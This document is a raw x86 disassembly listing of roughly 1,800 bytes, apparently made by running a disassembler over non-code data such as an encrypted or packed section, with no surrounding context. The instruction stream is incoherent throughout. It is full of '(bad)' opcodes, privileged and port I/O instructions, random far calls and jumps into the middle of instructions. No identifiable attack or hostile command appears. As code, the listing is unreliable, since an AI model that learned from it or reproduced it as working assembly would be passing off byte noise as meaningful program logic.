  40ee61:	adc    eax,0x303a553
  40ee66:	and    BYTE PTR [edx-0x78794e7],cl
  40ee6c:	or     DWORD PTR [edi+0x373d4e24],0xf7dd48e6
  40ee76:	std    
  40ee77:	jle    0x40ee38
  40ee79:	jo     0x40eea5
  40ee7b:	xor    BYTE PTR [edi-0x2cbfd32e],ch
  40ee81:	jbe    0x40ee06
  40ee83:	add    BYTE PTR [esi+edx*2+0x17],al
  40ee87:	push   edi
  40ee88:	cs cdq 
  40ee8a:	push   esp
  40ee8b:	add    ah,BYTE PTR [esi-0x3]
  40ee8e:	rcl    DWORD PTR [eax+0x506c495],1
  40ee94:	mov    eax,0xb7eb402e
  40ee99:	push   ss
  40ee9a:	mov    ds:0xedb73dee,eax
  40ee9f:	push   esi
  40eea0:	repnz cmp ecx,edi
  40eea3:	ins    BYTE PTR es:[edi],dx
  40eea4:	idiv   DWORD PTR [ebx+0x4579eeeb]
  40eeaa:	jmp    0x40ee92
  40eeac:	sbb    DWORD PTR [ebx+0x7a7a6020],eax
  40eeb2:	call   0x868d:0x1a45c5c5
  40eeb9:	int    0x23
  40eebb:	push   0xddbb7f20
  40eec0:	out    0xc2,al
  40eec2:	test   DWORD PTR [ebx],ecx
  40eec4:	je     0x40ef00
  40eec6:	sbb    eax,0x76602082
  40eecb:	jbe    0x40ef23
  40eecd:	and    eax,0x19b274d1
  40eed2:	lds    esi,FWORD PTR [ecx-0x34]
  40eed5:	cli    
  40eed6:	cli    
  40eed7:	cmp    dl,BYTE PTR [edi+0x6b625d2e]
  40eedd:	imul   ecx,DWORD PTR [ebx],0xffffffcf
  40eee0:	repz fcomp st(2)
  40eee3:	fcmovu st,st(2)
  40eee5:	inc    eax
  40eee6:	xchg   ebp,eax
  40eee7:	pop    ss
  40eee8:	xor    eax,0x9b23cea3
  40eeed:	(bad)
  40eef1:	mov    edi,0xcf6797df
  40eef6:	sahf   
  40eef7:	pop    ebp
  40eef8:	cmp    edi,DWORD PTR [ebx-0xa]
  40eefb:	in     al,dx
  40eefc:	pop    ds
  40eefd:	add    cl,BYTE PTR [ecx+0x10]
  40ef00:	add    al,0xd5
  40ef02:	(bad)
  40ef05:	cdq    
  40ef06:	xchg   DWORD PTR [esi],ebx
  40ef08:	jp     0x40eef2
  40ef0a:	into   
  40ef0b:	cdq    
  40ef0c:	cdq    
  40ef0d:	cdq    
  40ef0e:	mov    ebx,0x87e1e5be
  40ef13:	out    dx,eax
  40ef14:	mov    ebx,0x1f3bcee3
  40ef19:	sbb    BYTE PTR [edi],bl
  40ef1b:	sbb    ebx,DWORD PTR [ebx]
  40ef1d:	sbb    eax,DWORD PTR [esi-0x4e4a405f]
  40ef23:	sar    edx,0xda
  40ef26:	sbb    ch,ch
  40ef28:	push   esi
  40ef29:	dec    ebx
  40ef2a:	sbb    DWORD PTR [edx],ebx
  40ef2c:	jnp    0x40eeeb
  40ef2e:	or     al,0xfa
  40ef30:	xor    cl,BYTE PTR [eax]
  40ef32:	out    dx,al
  40ef33:	jbe    0x40ef4d
  40ef35:	dec    ecx
  40ef36:	scas   eax,DWORD PTR es:[edi]
  40ef37:	xlat   BYTE PTR ds:[ebx]
  40ef38:	or     al,0x72
  40ef3a:	adc    DWORD PTR [esi+0x278b9167],ebx
  40ef40:	cmp    al,0x86
  40ef42:	std    
  40ef43:	nop
  40ef44:	stos   DWORD PTR es:[edi],eax
  40ef45:	ret    
  40ef46:	jne    0x40eef6
  40ef48:	scas   al,BYTE PTR es:[edi]
  40ef49:	outs   dx,BYTE PTR ds:[esi]
  40ef4a:	jo     0x40ef2e
  40ef4c:	in     al,0x59
  40ef4e:	sub    dl,BYTE PTR [ebp-0x72a54af6]
  40ef54:	icebp  
  40ef55:	icebp  
  40ef56:	xor    DWORD PTR [esi],edx
  40ef58:	test   dh,0xf3
  40ef5b:	out    dx,al
  40ef5c:	xlat   BYTE PTR ds:[ebx]
  40ef5d:	dec    edi
  40ef5e:	repz fucomp st(7)
  40ef61:	pop    edx
  40ef62:	and    al,0xe6
  40ef64:	xor    bl,bl
  40ef66:	lods   eax,DWORD PTR ds:[esi]
  40ef67:	test   BYTE PTR [ebx+0x6b],cl
  40ef6a:	sub    eax,0xc7a4fcbe
  40ef6f:	jae    0x40efc0
  40ef71:	mov    ebp,0x163f1fc8
  40ef76:	jae    0x40efed
  40ef78:	stc    
  40ef79:	adc    eax,0x447b3636
  40ef7e:	popf   
  40ef7f:	xor    DWORD PTR [eax],ebp
  40ef81:	aad    0x55
  40ef83:	test   al,0x73
  40ef85:	cmc    
  40ef86:	and    BYTE PTR [edi+ecx*1-0x7d],dl
  40ef8a:	out    dx,eax
  40ef8b:	jecxz  0x40ef56
  40ef8d:	xor    ebp,DWORD PTR [eax+0xc8b4]
  40ef93:	and    BYTE PTR [eax],al
  40ef95:	dec    ecx
  40ef96:	inc    esp
  40ef97:	inc    ecx
  40ef98:	push   esp
  40ef99:	push   cs
  40ef9a:	and    bl,dl
  40ef9c:	test   BYTE PTR [eax+0xb],bh
  40ef9f:	adc    DWORD PTR [ebp+0x23],ebp
  40efa2:	jecxz  0x40ef5a
  40efa4:	sahf   
  40efa5:	sbb    al,0xa5
  40efa7:	cdq    
  40efa8:	xor    al,0xb4
  40efab:	(bad)  
  40efac:	rol    BYTE PTR [ecx+0x53],0x40
  40efb0:	xchg   BYTE PTR [ecx],dh
  40efb2:	or     BYTE PTR [ecx],al
  40efb4:	push   edx
  40efb5:	xor    eax,DWORD PTR [esi-0x500839dc]
  40efbb:	lods   eax,DWORD PTR ds:[esi]
  40efbc:	outs   dx,BYTE PTR ds:[esi]
  40efbd:	cli    
  40efbe:	mov    esi,0x25dbb74f
  40efc3:	mov    fs,WORD PTR [ebx-0x75]
  40efc6:	push   es
  40efc7:	aad    0x65
  40efc9:	add    al,0xc0
  40efcb:	in     eax,0x5b
  40efcd:	(bad)  
  40efce:	leave  
  40efcf:	aaa    
  40efd0:	shr    BYTE PTR [esi+0x2a],1
  40efd3:	and    DWORD PTR [eax-0x37750b6f],ecx
  40efd9:	dec    ebp
  40efda:	add    al,BYTE PTR [ebx+edx*4+0x25]
  40efde:	and    eax,0x5a67e51b
  40efe3:	mov    esi,0x2b91400e
  40efe8:	out    dx,eax
  40efe9:	pop    edx
  40efea:	test   BYTE PTR [esp+eax*4+0x1a],bl
  40efee:	jbe    0x40f062
  40eff0:	add    DWORD PTR [esi],edx
  40eff2:	in     eax,dx
  40eff3:	iret   
  40eff4:	aas    
  40eff5:	dec    edi
  40eff6:	adc    DWORD PTR [ecx],edx
  40eff8:	sbb    dh,ah
  40effa:	push   ebx
  40effb:	scas   eax,DWORD PTR es:[edi]
  40effc:	xlat   BYTE PTR ds:[ebx]
  40effd:	cdq    
  40effe:	cwde   
  40efff:	cwde   
  40f000:	pusha  
  40f001:	pop    edx
  40f002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f003:	(bad)  
  40f004:	xor    bh,bl
  40f006:	inc    eax
  40f007:	mov    ecx,0xb6b6b701
  40f00c:	fcomp  st(0)
  40f00e:	fsub   DWORD PTR [eax-0x54ae1429]
  40f014:	aad    0x58
  40f016:	pop    esp
  40f017:	pop    esp
  40f018:	fs jl  0x40f097
  40f01b:	fcomp  QWORD PTR [edx]
  40f01d:	jmp    0x40f001
  40f01f:	cmp    BYTE PTR [esi-0x4e4d1225],ah
  40f025:	mov    cl,0xc1
  40f027:	xchg   ebp,eax
  40f028:	sub    edx,DWORD PTR [edi+0x68]
  40f02b:	mov    bh,0xdb
  40f02d:	lods   al,BYTE PTR ds:[esi]
  40f02e:	scas   eax,DWORD PTR es:[edi]
  40f02f:	scas   eax,DWORD PTR es:[edi]
  40f030:	pop    edi
  40f031:	pop    ecx
  40f032:	pop    esi
  40f033:	pop    esi
  40f034:	jle    0x40f020
  40f036:	aam    0xa9
  40f038:	push   ebx
  40f039:	pop    edi
  40f03a:	jle    0x40f02d
  40f03c:	lds    edx,FWORD PTR [edi]
  40f03e:	lahf   
  40f03f:	inc    eax
  40f040:	and    DWORD PTR [eax],eax
  40f042:	sti    
  40f043:	push   0xab485fb9
  40f048:	ins    BYTE PTR es:[edi],dx
  40f049:	add    al,0x40
  40f04b:	sbb    DWORD PTR [eax-0x79e6ebaf],edx
  40f051:	mov    al,0x2
  40f053:	jl     0x40f046
  40f055:	out    0x7f,eax
  40f057:	(bad)  
  40f058:	out    0xab,eax
  40f05a:	rcl    ebx,cl
  40f05c:	rcl    DWORD PTR [ebx-0x1f07c1f1],cl
  40f062:	and    DWORD PTR [ebp+0xfbba5a5],0x687c3e1f
  40f06c:	ins    BYTE PTR es:[edi],dx
  40f06d:	ins    BYTE PTR es:[edi],dx
  40f06e:	ins    BYTE PTR es:[edi],dx
  40f06f:	jbe    0x40f0d2
  40f071:	jle    0x40f0f1
  40f073:	sub    ch,BYTE PTR [eax]
  40f075:	xchg   ebp,eax
  40f076:	retfw  0x3041
  40f07a:	jecxz  0x40f0f5
  40f07c:	pop    esi
  40f07d:	xor    BYTE PTR [esi+ecx*1],bl
  40f080:	imul   ebx,DWORD PTR [ecx],0x84a8025b
  40f086:	sub    BYTE PTR [ecx-0x7c],dl
  40f089:	lock cmp al,0x3b
  40f08c:	daa    
  40f08d:	loope  0x40f064
  40f08f:	pusha  
  40f090:	or     dh,BYTE PTR [esi-0x64]
  40f093:	loopne 0x40f0b5
  40f095:	addr16 inc edi
  40f097:	pop    eax
  40f098:	js     0x40f058
  40f09a:	dec    edi
  40f09b:	sbb    al,0x45
  40f09d:	mov    ah,0xdb
  40f09f:	ins    DWORD PTR es:[edi],dx
  40f0a0:	(bad)  
  40f0a2:	ss xchg edi,eax
  40f0a4:	cs pop ebp
  40f0a6:	(bad)  
  40f0a7:	and    DWORD PTR [ebp+0x6cd9a25],esi
  40f0ad:	mov    bl,0xf3
  40f0af:	xor    ecx,DWORD PTR [edi+ecx*4+0x6f5df18d]
  40f0b6:	das    
  40f0b7:	repz xchg ecx,eax
  40f0b9:	neg    ebp
  40f0bb:	inc    ebp
  40f0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0bd:	pop    edi
  40f0be:	inc    ebx
  40f0bf:	and    al,0x9
  40f0c1:	(bad)  
  40f0c2:	sbb    eax,0x89f6790b
  40f0c7:	stos   DWORD PTR es:[edi],eax
  40f0c8:	pop    esp
  40f0c9:	pop    esi
  40f0ca:	pop    ebp
  40f0cb:	out    0xdc,eax
  40f0cd:	dec    edx
  40f0ce:	enter  0xcaca,0xcb
  40f0d2:	pushf  
  40f0d3:	mov    esi,0xc41c24d4
  40f0d8:	stos   BYTE PTR es:[edi],al
  40f0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0da:	inc    ecx
  40f0db:	mov    edi,0xa879a504
  40f0e0:	in     al,dx
  40f0e1:	push   edi
  40f0e2:	fiadd  WORD PTR [esi-0x27]
  40f0e5:	and    DWORD PTR [edi+ecx*1-0x48eee0b7],0xffffff91
  40f0ed:	jb     0x40f097
  40f0ef:	and    bl,BYTE PTR [ebx+eiz*8]
  40f0f2:	or     cl,BYTE PTR ds:[ecx+ecx*2+0x74e2f654]
  40f0fa:	push   ds
  40f0fb:	test   BYTE PTR [ecx+0x34844050],cl
  40f101:	push   0xffffffa1
  40f103:	push   ss
  40f104:	mov    ch,al
  40f106:	push   ecx
  40f107:	stos   BYTE PTR es:[edi],al
  40f108:	es inc ch
  40f10b:	ins    DWORD PTR es:[edi],dx
  40f10c:	cli    
  40f10d:	mov    eax,0xa8bdff3e
  40f112:	add    BYTE PTR [esi-0x2271c0db],ch
  40f118:	fidiv  DWORD PTR [ecx-0x52]
  40f11b:	cmc    
  40f11c:	xor    ecx,ecx
  40f11e:	dec    esp
  40f11f:	test   DWORD PTR [ebp+0x7e4ec8e3],0x37fd2570
  40f129:	push   edx
  40f12a:	add    eax,0x799b7af8
  40f12f:	push   ds
  40f130:	iret   
  40f131:	repz cwde 
  40f133:	cwde   
  40f134:	cwde   
  40f135:	pusha  
  40f136:	outs   dx,BYTE PTR ds:[esi]
  40f137:	outs   dx,BYTE PTR ds:[esi]
  40f138:	mov    cs,ecx
  40f13a:	leave  
  40f13b:	dec    ecx
  40f13c:	and    BYTE PTR [eax],0xc8
  40f13f:	and    BYTE PTR [edx-0x2a3a54aa],bl
  40f145:	stos   DWORD PTR es:[edi],eax
  40f146:	push   edi
  40f147:	pop    ecx
  40f148:	pop    ebx
  40f149:	pop    ebx
  40f14a:	inc    ebx
  40f14b:	dec    edx
  40f14c:	leave  
  40f14d:	aam    0xd4
  40f14f:	adc    al,0x8b
  40f151:	mov    ecx,DWORD PTR [ebx-0x732a54ac]
  40f157:	xchg   ecx,eax
  40f158:	jo     0x40f1c7
  40f15a:	ins    DWORD PTR es:[edi],dx
  40f15b:	lea    ecx,[ebx]
  40f15d:	pop    ss
  40f15e:	cs mov al,0xba
  40f161:	mov    edx,0x643870ca
  40f166:	jnp    0x40f1e3
  40f168:	sti    
  40f169:	loop   0x40f11c
  40f16b:	arpl   di,ax
  40f16d:	(bad)  
  40f16e:	loopne 0x40f149
  40f170:	addr16 lahf 
  40f172:	std    
  40f173:	jecxz  0x40f142
  40f175:	int    0xcd
  40f177:	push   ebp
  40f178:	aam    0xb8
  40f17a:	xor    DWORD PTR [ecx],edi
  40f17c:	mov    ch,0x61
  40f17e:	xchg   esp,eax
  40f17f:	clc    
  40f180:	mov    ebx,DWORD PTR [eax+0x7dd67481]
  40f186:	jge    0x40f206
  40f188:	cmp    eax,0x75649249
  40f18d:	jne    0x40f144
  40f18f:	cmc    
  40f190:	fxch   st(7)
  40f192:	jle    0x40f18a
  40f194:	pop    ecx
  40f195:	loopne 0x40f1e0
  40f197:	jge    0x40f166
  40f199:	jb     0x40f140
  40f19b:	push   edx
  40f19c:	or     DWORD PTR [edx],ebp
  40f19e:	xchg   ebp,eax
  40f19f:	dec    edx
  40f1a0:	stc    
  40f1a1:	cmc    
  40f1a2:	scas   eax,DWORD PTR es:[edi]
  40f1a3:	jg     0x40f1a2
  40f1a5:	rcr    BYTE PTR [ebp-0x7862189],cl
  40f1ab:	rol    BYTE PTR [ecx-0x64288fd],0xcd
  40f1b2:	outs   dx,DWORD PTR ds:[esi]
  40f1b3:	jle    0x40f225
  40f1b5:	iret   
  40f1b6:	sahf   
  40f1b7:	cmp    eax,0x468d1afb
  40f1bc:	mov    ch,0xb5
  40f1be:	mov    ch,0xc5
  40f1c0:	aad    0xab
  40f1c2:	push   edi
  40f1c3:	(bad)  
  40f1c5:	fsub   DWORD PTR [eax+0x7b]
  40f1c8:	jnp    0x40f225
  40f1ca:	int    0x85
  40f1cc:	shl    BYTE PTR [ecx],1
  40f1ce:	stos   BYTE PTR es:[edi],al
  40f1cf:	stc    
  40f1d0:	call   0xbdce:0x3e90df8a
  40f1d7:	ins    BYTE PTR es:[edi],dx
  40f1d8:	out    0xca,al
  40f1da:	scas   al,BYTE PTR es:[edi]
  40f1db:	add    al,cl
  40f1dd:	popf   
  40f1de:	adc    DWORD PTR [edx+ebp*1-0x62d7ae56],0xffffffdb
  40f1e6:	and    BYTE PTR [ebx-0x4e4de3d0],ch
  40f1ec:	ds pusha 
  40f1ee:	ins    DWORD PTR es:[edi],dx
  40f1ef:	jge    0x40f24e
  40f1f1:	cmp    eax,0x95b236b3
  40f1f6:	retf   0x413e
  40f1f9:	push   eax
  40f1fa:	bound  esi,QWORD PTR [ecx-0x46]
  40f1fd:	leave  
  40f1fe:	inc    ebx
  40f1ff:	pop    ds
  40f200:	cdq    
  40f201:	daa    
  40f202:	test   al,0x1c
  40f204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f205:	push   esp
  40f206:	outs   dx,BYTE PTR ds:[esi]
  40f207:	push   edx
  40f208:	cs xchg ebp,eax
  40f20a:	mov    DWORD PTR [ebp-0x40],esp
  40f20d:	pusha  
  40f20e:	xor    al,ah
  40f210:	jae    0x40f271
  40f212:	mov    edi,DWORD PTR [ecx-0x12]
  40f215:	icebp  
  40f216:	xchg   ebx,eax
  40f217:	cmp    al,0x72
  40f219:	adc    al,0x5e
  40f21b:	jns    0x40f1fe
  40f21d:	sub    bl,BYTE PTR [ebx-0x62db5415]
  40f223:	xor    eax,esi
  40f225:	retf   
  40f226:	rcr    al,1
  40f228:	add    esi,ebp
  40f22a:	ret    
  40f22b:	mov    BYTE PTR [eax+0x2a4af082],ah
  40f231:	mov    esp,0xd10ab879
  40f236:	push   ss
  40f237:	inc    esp
  40f238:	sbb    ecx,eax
  40f23a:	jo     0x40f24f
  40f23c:	push   eax
  40f23d:	icebp  
  40f23e:	or     ah,BYTE PTR [eax+0x1b56e012]
  40f244:	xchg   edx,eax
  40f245:	sti    
  40f246:	out    dx,al
  40f247:	imul   esi,DWORD PTR [eax],0xe4818a74
  40f24d:	mov    ebp,0x5befbe56
  40f252:	xor    al,0x6
  40f254:	sbb    ecx,esp
  40f256:	shl    esi,cl
  40f258:	push   ebp
  40f259:	retf   0x6003
  40f25c:	fisubr DWORD PTR [esi+0x25aa00bd]
  40f262:	call   0xb097:0x145555d8
  40f269:	pop    ebp
  40f26a:	add    cl,BYTE PTR [edi-0x6e]
  40f26d:	cwde   
  40f26e:	cmp    dh,cl
  40f270:	xor    al,BYTE PTR [eax]
  40f272:	xlat   BYTE PTR ds:[ebx]
  40f273:	push   es
  40f274:	lock cmc 
  40f276:	stos   BYTE PTR es:[edi],al
  40f277:	add    BYTE PTR [edi],dh
  40f279:	loop   0x40f2b0
  40f27b:	sub    BYTE PTR [edx-0x9912662],bh
  40f281:	aad    0x6a
  40f283:	xor    eax,0x9fdfeff6
  40f288:	sub    edi,0xd7af5f66
  40f28e:	jecxz  0x40f28c
  40f290:	stc    
  40f291:	rep lods al,BYTE PTR ds:[esi]
  40f293:	scas   al,BYTE PTR es:[edi]
  40f294:	scas   al,BYTE PTR es:[edi]
  40f295:	xchg   edx,eax
  40f296:	and    al,0x9
  40f298:	rcl    ebx,cl
  40f29a:	shr    DWORD PTR [ebp*1+0x56ad512d],cl
  40f2a1:	xor    esi,edi
  40f2a3:	outs   dx,BYTE PTR ds:[esi]
  40f2a4:	mov    ch,0x5a
  40f2a6:	pushf  
  40f2a7:	cmp    eax,0xe5e5967b
  40f2ac:	gs loop 0x40f2e7
  40f2af:	es or  al,0xc3
  40f2b2:	rcl    DWORD PTR [ebx+0x4f],0x3d
  40f2b6:	cmc    
  40f2b7:	imul   ecx,edi,0x3d
  40f2ba:	neg    esp
  40f2bc:	pop    ds
  40f2bd:	ins    DWORD PTR es:[edi],dx
  40f2be:	ins    BYTE PTR es:[edi],dx
  40f2bf:	ins    BYTE PTR es:[edi],dx
  40f2c0:	lods   al,BYTE PTR ds:[esi]
  40f2c1:	mov    eax,ds:0xa129b8a4
  40f2c6:	jmp    0x40f2da
  40f2c8:	mov    ecx,0xdbafceb8
  40f2cd:	not    edx
  40f2cf:	stc    
  40f2d0:	push   ebx
  40f2d1:	dec    edx
  40f2d2:	lods   al,BYTE PTR ds:[esi]
  40f2d3:	bound  ecx,QWORD PTR [eax]
  40f2d5:	gs mov ebp,0xc18012d
  40f2db:	push   es
  40f2dc:	leave  
  40f2dd:	pusha  
  40f2de:	xor    al,ch
  40f2e0:	cmp    eax,0xc723c8f2
  40f2e5:	push   ds
  40f2e6:	jns    0x40f2cc
  40f2e8:	xchg   ecx,eax
  40f2e9:	add    DWORD PTR [bx+di-0x51],edx
  40f2ed:	xlat   BYTE PTR ds:[ebx]
  40f2ee:	(bad)  
  40f2ef:	out    dx,al
  40f2f0:	cmp    al,0x7c
  40f2f2:	js     0x40f2ea
  40f2f4:	fwait
  40f2f5:	out    dx,eax
  40f2f6:	mov    edi,0x47239eff
  40f2fb:	mov    ds,esp
  40f2fd:	sti    
  40f2fe:	lock ret 
  40f300:	(bad)  
  40f302:	jo     0x40f368
  40f304:	popa   
  40f305:	loope  0x40f2e7
  40f307:	clc    
  40f308:	clc    
  40f309:	js     0x40f2c8
  40f30b:	shr    DWORD PTR [esi-0x4d],cl
  40f30e:	jp     0x40f305
  40f310:	sub    bl,BYTE PTR [ebp-0x4a0a78b2]
  40f316:	xor    eax,0x4daedd7a
  40f31b:	pop    edi
  40f31c:	in     eax,dx
  40f31d:	(bad)  
  40f31e:	push   esp
  40f31f:	xor    al,0x7d
  40f321:	mov    bh,0xdb
  40f323:	xchg   esi,eax
  40f324:	daa    
  40f325:	js     0x40f2ab
  40f327:	jno    0x40f2fc
  40f329:	adc    eax,0x526a2bec
  40f32e:	fisubr DWORD PTR [ecx+0x7b8516a5]
  40f334:	sahf   
  40f335:	rcr    BYTE PTR [edi-0x6a5b667c],cl
  40f33b:	nop
  40f33c:	hlt    
  40f33d:	adc    eax,DWORD PTR [esi]
  40f33f:	test   BYTE PTR [ebx+ebx*8+0x5797965d],dh
  40f346:	push   esp
  40f347:	lods   al,BYTE PTR ds:[esi]
  40f348:	inc    edx
  40f349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f34a:	inc    esp
  40f34b:	mov    ds:0x4a7a60d1,eax
  40f350:	fldenv [ebp+0x3e]
  40f353:	lock xchg esi,eax
  40f355:	dec    ecx
  40f356:	ds (bad) 
  40f358:	pop    ss
  40f359:	mov    esi,0x625c7e99
  40f35e:	rcl    BYTE PTR [ebx-0x6f1a1284],1
  40f364:	scas   eax,DWORD PTR es:[edi]
  40f365:	dec    cl
  40f367:	sbb    ch,BYTE PTR [ebx]
  40f369:	sub    esp,DWORD PTR [edi-0x49503c08]
  40f36f:	mov    eax,0xed18f27a
  40f374:	mov    ch,0x6
  40f376:	jb     0x40f320
  40f378:	sbb    edx,eax
  40f37a:	fdivr  DWORD PTR [esp+edx*8]
  40f37d:	punpcklwd mm6,DWORD PTR [edx]
  40f380:	and    DWORD PTR [ebx-0x2f],edi
  40f383:	cmp    al,BYTE PTR [ebx+ebx*4+0x10]
  40f387:	scas   al,BYTE PTR es:[edi]
  40f388:	shl    BYTE PTR [eax-0x7d],0x5a
  40f38c:	lods   eax,DWORD PTR ds:[esi]
  40f38d:	ret    
  40f38e:	loop   0x40f352
  40f390:	sbb    bl,al
  40f392:	mov    al,0xef
  40f394:	cmp    al,0xee
  40f396:	sub    dl,dh
  40f398:	ins    BYTE PTR es:[edi],dx
  40f399:	mov    bh,0xdb
  40f39b:	inc    ebp
  40f39c:	mov    WORD PTR [ebp+0x1b],?
  40f39f:	aaa    
  40f3a0:	icebp  
  40f3a1:	loopne 0x40f34e
  40f3a3:	shl    BYTE PTR [esi+0x65],1
  40f3a6:	add    al,0x4
  40f3a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3a9:	test   DWORD PTR [edi],0x8d1a0306
  40f3af:	xchg   BYTE PTR [esi-0x1ffba603],al
  40f3b5:	sbb    bh,dh
  40f3b7:	fsub   st(7),st
  40f3b9:	imul   ebp,DWORD PTR [edx],0xf54516a1
  40f3bf:	in     eax,0xdb
  40f3c1:	lea    ebp,[edx+0x4c7a3700]
  40f3c7:	fidiv  WORD PTR [eax]
  40f3c9:	push   0xd9b37e24
  40f3ce:	mov    ah,0x7a
  40f3d0:	mov    ebx,0xfecccdd1
  40f3d5:	dec    esi
  40f3d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3d7:	ret    
  40f3d8:	retf   0x8aca
  40f3db:	and    eax,0x49c9c9fc
  40f3e0:	push   ss
  40f3e1:	push   ss
  40f3e2:	push   ss
  40f3e3:	sbb    BYTE PTR [ebx],bl
  40f3e5:	sbb    ecx,ebx
  40f3e7:	and    al,0x79
  40f3e9:	fcomp  st(6)
  40f3eb:	fsubrp st(6),st
  40f3ed:	fdivr  QWORD PTR [ecx+0x7cbe5c73]
  40f3f3:	cdq    
  40f3f4:	dec    esi
  40f3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3f6:	ret    
  40f3f7:	div    dh
  40f3f9:	div    dh
  40f3fb:	repnz repnz repnz push edi
  40f3ff:	mov    ds,WORD PTR [edi]
  40f401:	aas    
  40f402:	(bad)  
  40f403:	fnstenv [ebx]
  40f405:	addr16 into 
  40f407:	mov    esp,0xa6d02284
  40f40c:	mov    ecx,0x9042053d
  40f411:	sub    al,0xd1
  40f413:	jecxz  0x40f431
  40f415:	fwait
  40f416:	dec    ebp
  40f418:	xor    eax,DWORD PTR [edx+0x36a37efc]
  40f41e:	call   0x28455abd
  40f423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f424:	and    edi,DWORD PTR [ebx-0xb8b9123]
  40f42a:	stc    
  40f42b:	out    0x2f,eax
  40f42d:	sbb    al,0x7d
  40f42f:	(bad)  
  40f430:	stc    
  40f431:	push   ebx
  40f432:	shl    BYTE PTR [edi+0x6a],0xb5
  40f436:	pop    edx
  40f437:	jae    0x40f4a7
  40f439:	outs   dx,BYTE PTR ds:[esi]
  40f43a:	outs   dx,BYTE PTR ds:[esi]
  40f43b:	cli    
  40f43c:	mov    eax,ds:0x783a1e87
  40f441:	(bad)  
  40f442:	std    
  40f443:	idiv   DWORD PTR [edi]
  40f445:	hlt    
  40f446:	out    0xdf,eax
  40f448:	hlt    
  40f449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f44a:	xlat   BYTE PTR ds:[ebx]
  40f44b:	in     al,dx
  40f44c:	fnsave [edi+0x7743ceef]
  40f452:	fcom   QWORD PTR [ecx-0x69]
  40f455:	push   eax
  40f456:	sbb    DWORD PTR [ebx+edi*4-0xc],esi
  40f45a:	pop    es
  40f45b:	add    esp,DWORD PTR [ebp-0x45]
  40f45e:	fcomp  st(0)
  40f460:	mov    al,0xf6
  40f462:	getsec 
  40f464:	aam    0x39
  40f466:	lods   eax,DWORD PTR ds:[esi]
  40f467:	(bad)  
  40f469:	add    ecx,DWORD PTR [ecx+eax*2+0xf9d231b]
  40f470:	mov    eax,ds:0x10da74dd
  40f475:	and    ah,BYTE PTR ds:0x9a8a44d2
  40f47b:	ins    DWORD PTR es:[edi],dx
  40f47c:	out    0x1c,al
  40f47e:	int    0x30
  40f480:	pop    esp
  40f481:	adc    DWORD PTR [ecx+0x178db6bf],0x410bf774
  40f48b:	adc    al,0x25
  40f48d:	ins    BYTE PTR es:[edi],dx
  40f48e:	ins    DWORD PTR es:[edi],dx
  40f48f:	outs   dx,BYTE PTR ds:[esi]
  40f490:	mov    bl,0xb9
  40f492:	mov    cl,0x5
  40f494:	inc    edx
  40f495:	jo     0x40f4d3
  40f497:	or     BYTE PTR [eax-0x7073346c],ch
  40f49d:	xor    eax,0xf38c4e68
  40f4a2:	out    0x96,eax
  40f4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a5:	jns    0x40f49e
  40f4a7:	fistp  WORD PTR [ecx+0x76c2de04]
  40f4ad:	dec    edi
  40f4ae:	mov    al,0xba
  40f4b0:	fsubrp st(5),st
  40f4b2:	idiv   DWORD PTR [edi-0x198a4e16]
  40f4b8:	sub    al,0xbf
  40f4ba:	call   FWORD PTR [eax-0x75]
  40f4bd:	push   edi
  40f4be:	sahf   
  40f4bf:	cmp    DWORD PTR [edx-0x41],ecx
  40f4c2:	mov    ebx,0x46993f45
  40f4c7:	xor    esp,DWORD PTR es:[ecx+esi*8]
  40f4cb:	adc    al,0x88
  40f4cd:	inc    ebp
  40f4ce:	test   al,0x1f
  40f4d0:	test   BYTE PTR [edx+0x9],ch
  40f4d3:	outs   dx,DWORD PTR ds:[esi]
  40f4d4:	cld    
  40f4d5:	adc    eax,0xbf490d9a
  40f4da:	xlat   BYTE PTR ds:[ebx]
  40f4db:	inc    ecx
  40f4dc:	gs xor dl,cl
  40f4df:	stos   BYTE PTR es:[edi],al
  40f4e0:	add    BYTE PTR [esi],ah
  40f4e2:	xchg   esi,eax
  40f4e3:	arpl   WORD PTR [eax],di
  40f4e5:	sub    al,0x9c
  40f4e7:	sub    eax,ebx
  40f4e9:	push   es
  40f4ea:	pop    esi
  40f4eb:	xchg   ebp,eax
  40f4ec:	imul   eax,eax,0xdd2eda6
  40f4f2:	test   al,0x2a
  40f4f4:	mov    al,ds:0xa41d7af4
  40f4f9:	pushf  
  40f4fa:	rcl    BYTE PTR [edx+0x34],cl
  40f4fd:	(bad)  
  40f4fe:	mov    eax,0x401b5d03
  40f503:	push   0xfffffff4
  40f505:	shl    DWORD PTR [edi],cl
  40f507:	or     al,BYTE PTR [edx-0x5d5646b4]
  40f50d:	jbe    0x40f54c
  40f50f:	arpl   di,bx
  40f511:	mov    ch,0x8e
  40f513:	das    
  40f514:	xor    dh,ah
  40f516:	adc    eax,0xb56ab1c1
  40f51b:	retf   0xe4e4
  40f51e:	and    al,0xe3
  40f520:	jecxz  0x40f505
  40f522:	mov    WORD PTR [ebp+0xfa8598d],cs
  40f528:	shr    bh,1
  40f52a:	neg    ecx
  40f52c:	fcomp  st(0)
  40f52e:	pusha  
  40f52f:	arpl   WORD PTR [ebx-0x7d],sp
  40f532:	push   esi
  40f533:	stos   DWORD PTR es:[edi],eax
  40f534:	inc    ebp
  40f535:	mov    ch,0x5a
  40f537:	imul   ebp,DWORD PTR gs:[ecx-0x77],0xea49c9c9
  40f53f:	cmc    
  40f540:	mov    edx,0x4e9d0745
  40f545:	xchg   DWORD PTR [ebx-0x1a8dd0e9],ecx
  40f54b:	retf   0x5615
  40f54e:	push   esi
  40f54f:	push   esi
  40f550:	push   0xa5e15ab5
  40f555:	dec    ebx
  40f556:	xchg   edi,eax
  40f557:	sahf   
  40f558:	js     0x40f553
  40f55a:	in     eax,0x97
  40f55c:	mov    edi,0x85c2e176
  40f561:	out    0x37,eax
  40f563:	aaa    
